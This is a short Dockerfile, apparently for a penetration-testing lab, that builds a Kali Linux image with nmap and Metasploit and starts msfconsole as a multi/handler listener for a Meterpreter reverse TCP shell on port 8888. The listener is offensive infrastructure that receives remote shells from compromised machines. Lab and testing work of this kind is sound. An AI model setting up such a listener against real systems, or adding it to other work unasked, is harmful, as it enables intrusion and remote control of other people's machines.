# Use the latest Kali Linux image as the base
FROM kalilinux/kali-last-release:latest

# Set environment variables for non-interactive installation
ENV DEBIAN_FRONTEND=noninteractive

# Install
RUN apt update && \
    apt install -y\
    nmap \
    metasploit-framework \
    locales \
    iputils-ping

# Set remaining environment variables
RUN locale-gen en_US.UTF-8
ENV LANG en_US.UTF-8
ENV LANGUAGE en_US:en
ENV LC_ALL en_US.UTF-8

# Create the test folder
RUN mkdir -p /root/testing

#Open the port
EXPOSE 8888

# Start MSFConsole as a listener
CMD ["msfconsole", "-x", "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 8888; run"]
